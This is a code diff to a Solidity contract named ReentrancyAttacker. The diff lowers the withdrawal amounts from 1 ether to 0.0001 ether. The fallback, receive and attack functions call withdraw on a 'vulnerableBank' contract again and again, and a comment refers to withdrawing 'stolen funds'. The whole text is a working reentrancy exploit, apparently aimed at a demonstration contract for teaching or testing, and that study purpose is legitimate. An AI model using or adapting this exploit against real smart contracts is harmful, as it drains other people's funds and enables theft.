@@ -11,21 +11,24 @@ contract ReentrancyAttacker {
     }
 
     fallback() external payable {
-        if (address(vulnerableBank).balance >= 1 ether) {
-            vulnerableBank.withdraw(1 ether);
+        if (address(vulnerableBank).balance >= 0.0001 ether) {
+            vulnerableBank.withdraw(0.0001 ether);
         }
     }
 
     receive() external payable {
-        if (address(vulnerableBank).balance >= 1 ether) {
-            vulnerableBank.withdraw(1 ether);
+        if (address(vulnerableBank).balance >= 0.0001 ether) {
+            vulnerableBank.withdraw(0.0001 ether);
         }
     }
 
     function attack() public payable {
-        require(msg.value >= 1 ether, "Minimum 1 ether required to attack");
-        vulnerableBank.deposit{value: 1 ether}();
-        vulnerableBank.withdraw(1 ether);
+        require(
+            msg.value >= 0.0001 ether,
+            "Minimum 0.0001 ether required to attack"
+        );
+        vulnerableBank.deposit{value: 0.0001 ether}();
+        vulnerableBank.withdraw(0.0001 ether);
     }
 
     // Function to withdraw the stolen funds
